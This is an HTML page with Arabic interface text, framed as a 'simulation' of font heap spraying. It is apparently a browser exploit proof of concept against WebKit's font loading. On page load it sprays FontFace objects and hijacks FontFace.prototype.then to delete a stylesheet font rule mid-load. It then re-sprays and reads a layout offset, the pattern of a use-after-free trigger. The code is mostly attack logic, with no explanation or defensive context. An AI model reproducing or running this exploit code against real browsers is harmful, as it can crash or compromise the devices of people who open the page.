<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>محاكاة البنية التاريخية المستقرة</title>
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
        .log { margin-bottom: 8px; }
        .warn { color: #ffaa00; }
    </style>
    
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>

    <h2>محاكاة تنظيم الـ Heap (Structured Font Spray)</h2>
    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار مهلة الاستقرار...</div>

    <script>
        const consoleElement = document.getElementById('custom-console');
        function screenLog(msg, isWarn = false) {
            const entry = document.createElement('div');
            entry.className = isWarn ? 'log warn' : 'log';
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleElement.appendChild(entry);
            consoleElement.scrollTop = consoleElement.scrollHeight;
        }

        var bad_fonts = [];
        var SPRAY_FONTS = 1500; // الحجم المتوافق لمنع OOM التحديث

        function startExploitAnalysis() {
            consoleElement.innerHTML = ""; 
            screenLog("بدء تنظيم الذاكرة (Heap Packing)...");

            try {
                // 1. الإغراق البدئي كما هو في ملف webkit.js الأصلي
                for (var i = 0; i < SPRAY_FONTS; i++) {
                    bad_fonts.push(new FontFace("font1", "", {}));
                }
                screenLog(`تم حقن ${SPRAY_FONTS} كائن خط لتشكيل الـ Heap.`);

                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                bad_fonts.push(A);
                void A.loaded;

                let fired = false;

                // 2. كمين التداخل المستقر
                Object.defineProperty(FontFace.prototype, 'then', {
                    configurable: true,
                    get() {
                        if (!fired && this === A) {
                            fired = true;
                            screenLog("!! تم رصد التداخل المنطقي المستقر !!", true);
                            
                            try {
                                document.getElementById('s').sheet.deleteRule(0);
                                screenLog("تم حذف القاعدة بنجاح.");
                            } catch(e) { screenLog("خطأ الحذف: " + e.message, true); }
                            
                            // إغراق تعويضي سريع بعد الحذف
                            for (var i = 0; i < 200; i++) {
                                bad_fonts.push(new FontFace("font2", "", {}));
                            }

                            setTimeout(() => {
                                screenLog("قراءة الـ Offset المؤجلة...");
                                let offset = document.body.offsetTop;
                                screenLog("قيمة الـ Offset المسترجعة: " + offset);
                            }, 20);
                        }
                        
                        return function(resolve) { if (resolve) resolve(); };
                    }
                });

                screenLog("إطلاق طلب التحميل عبر الـ Layout Pipeline...");
                document.fonts.load('1em x', 'AB');

            } catch (err) {
                screenLog("خطأ عام: " + err.message, true);
            }
        }

        window.onload = () => {
            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية لتأمين الدخول الأول...");
            setTimeout(startExploitAnalysis, 1500);
        };
    </script>
</body>
</html>
